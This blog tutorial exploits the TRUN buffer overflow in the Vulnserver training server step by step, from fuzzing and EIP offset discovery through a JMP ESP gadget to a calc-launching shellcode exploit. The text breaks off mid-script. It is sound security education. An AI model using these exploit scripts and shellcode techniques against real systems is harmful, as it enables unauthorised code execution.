---
title: "Vulnserver Part 1 - TRUN"
published: 2021-09-07T12:01:00-04:00
updated: 2021-09-07T12:01:00-04:00
categories:
  - writeup
tags:
  - vulnserver
  - windows
  - bufferoverflow
  - binary
  - exploit
  - bof
summary: In this first part of our Vulnserver series we will take a look at the TRUN command. It offers a very simple Stack-based Buffer Overflow with a little bit of fuzzing... 
---

In this first part of [our Vulnserver series](/posts/vulnserver_0_overview.html) we will take a look at the TRUN command. It offers a very simple Stack-based Buffer Overflow with a little bit of fuzzing.

I'll go into a little more detail in this first tutorial, as some concepts might be new to beginners.

1. [AAAA? Not today!](#aaaa-not-today)
2. [Fuzzing for a Crash](#fuzzing-for-a-crash)
3. [Proof of Concept](#proof-of-concept)
4. [EIP Offset](#eip-offset)
5. [Bad Characters](#bad-characters)
6. [JMP ESP](#jmp-esp)
7. [Pop Calc](#pop-calc)
8. [Reverse Shell](#reverse-shell)


## AAAA? Not today!

This is the basic anatomy of a buffer overflow Proof of Concept:

```python
#!/usr/bin/env python3
# vanilla buffer overflow example
# this won't work here!
import socket

target_ip = "10.0.2.74" # ip address of your windows machine
target_port = 9999

size = 2048

# create a TCP socket connection to the target
s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))

# read the greeting / banner
banner = s.recv(1024)
print(banner)

# Prepare the payload
buf = b""
buf += b"TRUN "
buf += b"A" * size
buf += b"\n"

print("Sending evil buffer...")

# send the payload
# this will send: TRUN AAAAAAAAAA....
s.send(buf)

# If the exploit worked then this script should get "stuck" at this point 
# because the socket connection died before we could receive an answer from the server

# but if the server responds, then the exploit failed:
response = s.recv(1024)
print(response)

print("Done")
```

In other beginner tutorials you might have seen this code before. You would simply increase the value of `size` until the server crashes.

But you will quickly notice that this won't work here. What is going on here? We know the TRUN command is vulnerable, but regardless of how big the buffer is that you send, the server will not crash.

As it turns out the server requires a specific character sequence in order to crash.


## Fuzzing for a Crash

There are many fuzzers out there that can be used to test for buffer overflows (e.g. [SPIKE](https://github.com/guilhermeferreira/spikepp/tree/master/SPIKE)), but we will stick to Python3 in this tutorial and use the [boofuzz](https://boofuzz.readthedocs.io/en/stable/index.html) library.

```bash
$ python3 -m pip install boofuzz
```

The boofuzz website linked above offers a [Quickstart tutorial](https://boofuzz.readthedocs.io/en/stable/user/quickstart.html).

The basic setup is easy enough. I have created a file `trun_0_boofuzz.py`:

```python
#!/usr/bin/env python3
# TRUN - Step 0 -- Fuzzing for a crash
from boofuzz import *
import time
import sys

target_ip = "10.0.2.74"
target_port = 9999

# stop when server is dead
def is_alive(target, my_logger, session, *args, **kwargs):
    try:
        banner = target.recv(10000)

        # See if we received the standard banner
        if not banner or banner != b'Welcome to Vulnerable Server! Enter HELP for help.\n':
            raise Exception("Banner does not match")
    except:
        print("Unable to connect. Target is down. Exiting.")
        sys.exit(1)

def main():
    session = Session(
	sleep_time=1,
        target=Target(
            connection=SocketConnection(target_ip, target_port, proto='tcp')
        ),
    )

    s_initialize(name="Request")
    with s_block("Host-Line"):
        s_static("TRUN", name='command name')
        s_delim(" ")
        s_string("FUZZ",  name='trun variable content')
        s_delim("\r\n")

    # the callback function gets executed after each test
    session.connect(s_get("Request"), callback=is_alive) 
    session.fuzz()

if __name__ == "__main__":
	main()
```

Run the fuzzer:

```bash
$ python3 trun_0_boofuzz.py
```

The fuzzer should run for a few minutes and eventually stop executing once it detects a crash:


![Fuzzer crashes the server](/assets/img/vulnserver_trun_00_fuzzer_result.png)

In Immunity the Disassembly window will be completely black and the status "Access Violation when executing..." will be visible in the bottom left.

![The server is crashed](/assets/img/vulnserver_trun_01_fuzzer_crash.png)

Looks like we found a character sequence that works.

If we scroll up a bit in the window where we ran the boofuzz script then we can see the crash sequence is:

```python
b'TRUN /./././.' #... repeated many times
```

If we count the sent characters then we get a total length of 10007 bytes.

It seems the character values for '/' and '.' are required in order to cause a crash. Now the question would be how many of those we actually need in order to cause a crash. And whether we can replace some of those bytes with a proper payload. 


## Proof of Concept

After some trial and error I narrowed it down to the following sequence that can be used to consistently cause a crash:

```python
#!/usr/bin/env python3
# TRUN Step 1 - cause a crash / proof of concept
import socket

size = 4096
target_ip = "10.0.2.74"
target_port = 9999

buf = b""
buf += b"TRUN /."
buf += b"A" * size
buf += b"\n"

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))

# receive banner
banner = s.recv(1024)
print(banner)

# send evil buffer
print(f"Sending evil buffer with {len(buf)} bytes and payload length {size}...")
s.send(buf)

# receive response
a = s.recv(1024)
print(a)

s.close()
print("Done!")
```

The 'A' bytes represent the part of the buffer that we can freely use in order to upload a payload.


## EIP Offset

After running the PoC you might notice that the ESP (Stack Pointer) register points to a specific address in the overwritten stack space. And the EIP (Instruction Pointer) points to a non-existent address 0x41414141 (hex for "AAAA"). The crash was caused because the program tried to jump to that non-existent address.

![EIP location after crash](/assets/img/vulnserver_trun_10_eip_after_crash.png)

We will need to figure out the exact offset between the start of our sent buffer and this stack location if we want to take control over the command flow and hijack the program.

The metasploit framework comes with a convenient tool that can be used in order to generate a unique byte pattern:

```bash
$ msf-pattern_create -l 4096

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac...
```

The `-l` parameter should match the number of A's we previously sent.

Plug that sequence into our script:

```python
#!/usr/bin/env python3
# TRUN Step 2 - discover eip offset
import socket

size = 4096
target_ip = "10.0.2.74"
target_port = 9999
line_ending = b"\n"

# msf-pattern_create -l 4096
pattern = b""
pattern += b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"
pattern += b"d3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
pattern += b"6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9"
pattern += b"Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A"
pattern += b"n3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq"
pattern += b"6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9"
pattern += b"Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2A"
pattern += b"x3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba"
pattern += b"6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9"
pattern += b"Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"
pattern += b"h3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk"
pattern += b"6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9"
pattern += b"Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2B"
pattern += b"r3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu"
pattern += b"6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9"
pattern += b"By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2C"
pattern += b"b3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce"
pattern += b"6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9"
pattern += b"Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2C"
pattern += b"l3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co"
pattern += b"6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9"
pattern += b"Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2C"
pattern += b"v3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy"
pattern += b"6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9"
pattern += b"Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2D"
pattern += b"f3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di"
pattern += b"6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9"
pattern += b"Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2D"
pattern += b"p3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds"
pattern += b"6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9"
pattern += b"Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2D"
pattern += b"z3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec"
pattern += b"6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9"
pattern += b"Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2E"
pattern += b"j3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em"
pattern += b"6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9"
pattern += b"Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2E"
pattern += b"t3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew"
pattern += b"6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9"
pattern += b"Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2F"
pattern += b"d3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4F"


buf = b""
buf += b"TRUN /."
#buf += b"A" * size
buf += pattern
buf += line_ending

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))

# receive banner
banner = s.recv(1024)
print(banner)

# send evil buffer
print(f"Sending evil buffer with {len(buf)} bytes and payload length {size}...")
s.send(buf)

# receive response
a = s.recv(1024)
print(a)

s.close()
print("Done!")
```

After running this program we can once again check the value of the EIP on crash:

**EIP value on crash:** 6F43386F

Now we can determine the exact offset using another metasploit tool:

```bash
$ msf-pattern_offset -l 4096 -q 6F43386F

[*] Exact match at offset 2005
```

Let us confirm that we have control over the EIP:

```python
#!/usr/bin/env python3
# TRUN - Step 3 - control eip
import socket

offset = 2005
size = 4096
target_ip = "10.0.2.74"
target_port = 9999
line_ending = b"\n"

buf = b""
buf += b"TRUN /."
buf += b"A" * offset
buf += b"B" * 4
buf += b"C" * 4
buf += b"D" * (size - offset - 8)
buf += line_ending

# expected result:
# EIP content on crash: 42424242
# b'B' = 0x42

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))

# receive banner
banner = s.recv(1024)
print(banner)

# send evil buffer
print(f"Sending evil buffer with {len(buf)} bytes and payload length {size}...")
s.send(buf)

# receive response
a = s.recv(1024)
print(a)

s.close()
print("Done!")
```

That appears to have worked. We have control over the EIP:

![EIP under control](/assets/img/vulnserver_trun_11_eip_control.png)


## Bad Characters

The next step is figuring out what characters might break our exploit. We need to find the so-called "Bad Characters" or "Bad Chars".

These are usually byte values that have a special control function in the target application. 

For example the null byte (0x00) indicates the end of a C-style string. Quite often all content after such a null byte might be ignored and will not be written onto the stack. 

Other common bad chars are the new-line "\n" (0x0A) and the carriage return "\a" (0x0D).

In this example we are just sending bytes over a plain old TCP socket with no special protocol, but if we had to supply our buffer via an HTTP request with `x-www-urlencoded` body, then the url control characters '?' and '&' would also most likely be bad chars.

In this way the bad chars are somewhat predictable, but it is usually better to test all possible byte values just to be sure.

I have added a badchar generator to our exploit:

```python
#!/usr/bin/env python3
# TRUN - Step 4 - find bad characters
import socket

offset = 2005
size = 4096
target_ip = "10.0.2.74"
target_port = 9999
line_ending = b"\n" # new line 0x0a

# generate bad char test string
badchars = [ 0x00, 0x0a ] # found badchars to exclude. We can assume 0x00 and 0x0a (new line) are bad chars without trying
badstring = b""
for x in range(1,256):
    if(x not in badchars):
        badstring += bytes([x])

# write generated badchars to file for mona
f = open('/srv/samba/protected/badchars.bin', 'wb')
f.write(badstring)
f.close()

buf = b""
buf += b"TRUN /."
buf += b"A" * offset
buf += b"B" * 4         # EIP overwrite
buf += b"C" * 4
buf += badstring        # put the badchar test string after the EIP overwrite
buf += b"D" * (size - offset - 8 - len(badstring))
buf += line_ending

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))

# receive banner
banner = s.recv(1024)
print(banner)

# send evil buffer
print(f"Sending evil buffer with {len(buf)} bytes and payload length {size}...")
s.send(buf)

# receive response
a = s.recv(1024)
print(a)

s.close()
print("Done!")
```

The created test bytes will be appended after the EIP overwrite. This ensures that the application will definitely crash even if there are badchars included after the overwrite.

The script will also generate a file containing the bytes that we want to test. I have transfered this created file to the Windows machine via a mounted samba share. But you can of course also transfer it via some other method.

Once the server is in the crashed state you will find the badchar test string after the EIP overwrite:

![Badchar test string](/assets/img/vulnserver_trun_20_badchars.png)

Copy the stack address where our badchar test string starts:

```bash
0111F9CC   04030201 
```

This address will differ with each execution, so the above address is just an example. Leave the server in the crashed state.

Use this mona command in order to compare our exported badchars file with the stack content:

```bash
!mona compare -f Y:\badchars.bin -a 0111F9CC
```

![Badchar mona compare](/assets/img/vulnserver_trun_21_badchars_mona_command.png)

Mona will report that the comparison between file and stack content found no modifications:

![Badchar mona compare results](/assets/img/vulnserver_trun_22_badchars_mona_result.png)

This means we found all badchars already and can move on to the next step.

If you want to restore the regular layout of Immunity, then just close all the inner windows and click on `View` -> `CPU`. The usual layout should pop up, maximize it and you are back to normal.


## JMP ESP

Now that we found all badchars we can try to execute some instructions.

![EIP under control](/assets/img/vulnserver_trun_11_eip_control.png)

Normally the program will attempt to jump to the address that is stored on the stack where we wrote our four B's.

Now it sounds tempting to just jump to the address where our A's begin, put some shellcode there and call it a day. But sadly the address layout on the stack will differ with each execution. Those addresses are not static.

But as it so happens at the time of the crash there are two registers that hold addresses that we can use. 

As you can see in the screenshot above, the ESP points right after the `BBBB`, at the `CCCC`. And the EAX points to the beginning of our buffer "`TRUN /.AAAAA...`".

The ESP register is the more convenient choice. We can put our shellcode right after the `BBBB` and perform a jump to ESP (the address stored in the ESP register).

In order to perform this little maneuver, we will need to find a code snippet with a static address that performs a `JMP ESP` instruction. If we jump to the start of that `JMP ESP` instruction, then the program will execute it and we end up right back on the stack in the `CCCC` section. Everything there (starting with the C's) will then be executed.

Another useful metasploit tool allows us to figure out the byte value of that x86 instruction:

```bash
$ msf-nasm_shell

nasm > jmp esp
00000000 FFE4 jmp esp
```

Mona allows us to find possible candidates where we might find that byte snippet `FFE4`:

```bash
!mona modules
```

![Mona modules](/assets/img/vulnserver_trun_30_mona_modules.png)

Modules where most of the protections are disabled ("False") are preferable. This leaves us with `essfunc.dll` and the main binary `vulnserver.exe`.

We can once again use Mona in order to scan these modules for our desired byte sequence `FFE4`.
```bash
!mona find -s "\xff\xe4" -m "vulnserver.exe"
found 0 pointers
```
```bash
!mona find -s "\xff\xe4" -m "essfunc.dll"
found 9 pointers
```

The main binary is a bust, but `essfunc.dll` has 9 possible candidates.

![JMP ESP candidates](/assets/img/vulnserver_trun_31_possible_jmp_esp.png)

```bash
0x625011af : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\IEUser\Desktop\essfunc.dll)
0x625011bb : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\IEUser\Desktop\essfunc.dll)
0x625011c7 : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\IEUser\Desktop\essfunc.dll)
0x625011d3 : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\IEUser\Desktop\essfunc.dll)
0x625011df : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\IEUser\Desktop\essfunc.dll)
0x625011eb : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\IEUser\Desktop\essfunc.dll)
0x625011f7 : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\IEUser\Desktop\essfunc.dll)
0x62501203 : "\xff\xe4" | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\IEUser\Desktop\essfunc.dll)
0x62501205 : "\xff\xe4" | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\IEUser\Desktop\essfunc.dll)
```

In order to be usable, an address must not contain any of our found badchars. But it does not look like any of these addresses contain any badchars. They should all be usable.

So I went with the first one.

Make sure you write the address in small endian byte order onto the stack. The `struct` python standard library can take care of that for you:

```python
esp_gadget_address = 0x625011af
esp_gadget = struct.pack("<I", esp_gadget_address)
```

Here is the full script at this point:

```python
#!/usr/bin/env python3
# TRUN - Step 5 - JMP ESP
import socket
import struct

offset = 2005
size = 4096
target_ip = "10.0.2.74"
target_port = 9999
line_ending = b"\n" # new line 0x0a

badchars = [ 0x00, 0x0a ] # found badchars

esp_gadget_address = 0x625011af
esp_gadget = struct.pack("<I", esp_gadget_address)

buf = b""
buf += b"TRUN /."
buf += b"A" * offset

#buf += b"B" * 4         # EIP overwrite
buf += esp_gadget        # JMP ESP

buf += b"C" * 4
buf += b"D" * (size - offset - 8)
buf += line_ending

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))

# receive banner
banner = s.recv(1024)
print(banner)

# send evil buffer
print(f"Sending evil buffer with {len(buf)} bytes and payload length {size}...")
s.send(buf)

# receive response
a = s.recv(1024)
print(a)

s.close()
print("Done!")
```

Before you run this you should set a breakpoint on the address `625011af`. Reset the server and then use the black arrow in the menubar:

![Go to JMP ESP address](/assets/img/vulnserver_3_goto.png)

Once you are there and the `FFE4` is selected press `<F2>` in order to toggle a breakpoint. Now you can resume the execution by pressing `<F9>` or the red play button.

Run the script. 

You should hit the breakpoint. 

Use `<F7>` in order to step forward. With each step it should be executing the C's and afterwards hitting the D's.


![JMP ESP worked](/assets/img/vulnserver_trun_40_jmp_esp_success.png)

The C's will be interpreted as instruction `0x43` `INC EBX` and the D's will be interpreted as instruction `0x44` `INC ESP`.

Looks like we achieved code execution!


## Pop Calc

Before we send ourselves a reverse shell it is often a good idea to run a simpler shellcode first in order to make sure we have not missed anything.

A popular target is the notorious Windows calculator.

You can use (once again) a metasploit tool named msfvenom in order to create this payload:

```bash
$ msfvenom -p windows/exec CMD=calc.exe -b '\x00\x0A' -f python -v payload

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 220 (iteration=0)
x86/shikata_ga_nai chosen with final size 220
Payload size: 220 bytes
Final size of python file: 1180 bytes
payload =  b""
payload += b"\xdb\xc1\xbf\x08\x54\xa2\x44\xd9\x74\x24\xf4\x5a"
payload += b"\x29\xc9\xb1\x31\x31\x7a\x18\x83\xea\xfc\x03\x7a"
# ...
```

Please note that we gave msfvenom our badchars via the `-b` parameter.

But if you just put that payload right after the EIP overwrite you will notice it does not work.

Often shellcode requires some space to "do its thing".

That's why it is common practice to add some NOP's before the shellcode. There are some other methods, but I don't want to get into the weeds here.

A NOP `0x90` instruction is short for "no operation". It simply does nothing. That makes it useful for padding and stack alignment.

I added 32 NOPs before the pop calc shellcode, for good measures.


```python
NOP = b"\x90"
# ...
buf += NOP * 32
buf += payload
# ...
```

We have enough space after the EIP overwrite, so it does not matter too much.

Here is the calc popper script:

```python
#!/usr/bin/env python3
# TRUN - Step 6 - Pop Calc
import socket
import struct

offset = 2005
size = 4096
target_ip = "10.0.2.74"
target_port = 9999
line_ending = b"\n"         # new line 0x0a
badchars = [ 0x00, 0x0a ]   # found badchars
esp_gadget_address = 0x625011af
esp_gadget = struct.pack("<I", esp_gadget_address)
NOP = b"\x90"

# msfvenom -p windows/exec CMD=calc.exe -b '\x00\x0A' -f python -v payload
payload =  b""
payload += b"\xdb\xd7\xbe\x81\x73\xbe\xe6\xd9\x74\x24\xf4\x5a"
payload += b"\x33\xc9\xb1\x31\x83\xc2\x04\x31\x72\x14\x03\x72"
payload += b"\x95\x91\x4b\x1a\x7d\xd7\xb4\xe3\x7d\xb8\x3d\x06"
payload += b"\x4c\xf8\x5a\x42\xfe\xc8\x29\x06\xf2\xa3\x7c\xb3"
payload += b"\x81\xc6\xa8\xb4\x22\x6c\x8f\xfb\xb3\xdd\xf3\x9a"
payload += b"\x37\x1c\x20\x7d\x06\xef\x35\x7c\x4f\x12\xb7\x2c"
payload += b"\x18\x58\x6a\xc1\x2d\x14\xb7\x6a\x7d\xb8\xbf\x8f"
payload += b"\x35\xbb\xee\x01\x4e\xe2\x30\xa3\x83\x9e\x78\xbb"
payload += b"\xc0\x9b\x33\x30\x32\x57\xc2\x90\x0b\x98\x69\xdd"
payload += b"\xa4\x6b\x73\x19\x02\x94\x06\x53\x71\x29\x11\xa0"
payload += b"\x08\xf5\x94\x33\xaa\x7e\x0e\x98\x4b\x52\xc9\x6b"
payload += b"\x47\x1f\x9d\x34\x4b\x9e\x72\x4f\x77\x2b\x75\x80"
payload += b"\xfe\x6f\x52\x04\x5b\x2b\xfb\x1d\x01\x9a\x04\x7d"
payload += b"\xea\x43\xa1\xf5\x06\x97\xd8\x57\x4c\x66\x6e\xe2"
payload += b"\x22\x68\x70\xed\x12\x01\x41\x66\xfd\x56\x5e\xad"
payload += b"\xba\xa9\x14\xec\xea\x21\xf1\x64\xaf\x2f\x02\x53"
payload += b"\xf3\x49\x81\x56\x8b\xad\x99\x12\x8e\xea\x1d\xce"
payload += b"\xe2\x63\xc8\xf0\x51\x83\xd9\x92\x34\x17\x81\x7a"
payload += b"\xd3\x9f\x20\x83"

buf = b""
buf += b"TRUN /."
buf += b"A" * offset
buf += esp_gadget        # JMP ESP
buf += NOP * 32
buf += payload
buf += b"D" * (size - offset - 4 - 32 - len(payload))
buf += line_ending

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))

# receive banner
banner = s.recv(1024)
print(banner)

# send evil buffer
print(f"Sending evil buffer with {len(buf)} bytes and payload length {size}...")
